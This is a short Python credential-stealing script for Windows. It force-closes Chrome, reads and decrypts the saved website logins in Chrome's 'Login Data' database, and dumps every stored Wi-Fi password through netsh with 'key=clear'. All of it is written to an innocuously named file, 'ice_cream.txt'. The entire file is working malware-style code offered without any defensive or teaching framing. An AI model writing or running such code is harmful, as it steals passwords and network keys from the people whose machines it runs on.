import os, re, sqlite3,win32crypt

# Close currently running Chrome and Connect to sqlite3 db
browserExe = "chrome.exe"
os.system("taskkill /f /im "+browserExe)
data=os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
connection = sqlite3.connect(data)
print("[>]Connected to data base..")

# Collect data from db
cursor = connection.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
final_data=cursor.fetchall()
print("[>]Found "+str(len(final_data))+" password..")

#Get all saved wifi networks names
def get_wlans():
    data = os.popen("netsh wlan show profiles").read()
    wifi = re.compile("All User Profile\s*:.(.*)")
    return wifi.findall(data)

#Get a password for a network
def get_pass(network):
    try:
        wlan = os.popen("netsh wlan show profile "+str(network.replace(" ","*"))+" key=clear").read()
        pass_regex = re.compile("Key Content\s*:.(.*)")
        return pass_regex.search(wlan).group(1)
    except:
        return " "

# Write into file
f = open("ice_cream.txt","w")
for wlan in get_wlans():
    f.write("\n-----------\n"+" SSID : "+wlan + "\n Password : " + get_pass(wlan))
f.write("\n\nExtracted chrome passwords :\n")
for website_data in final_data:
    password = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1]
    one="Website  : "+str(website_data[0])
    two="Username : "+str(website_data[1])
    three="Password : "+str(password)
    f.write(one+"\n"+two+"\n"+three)
    f.write("\n"+" == ==="*10+"\n")
f.close()

print("Done")
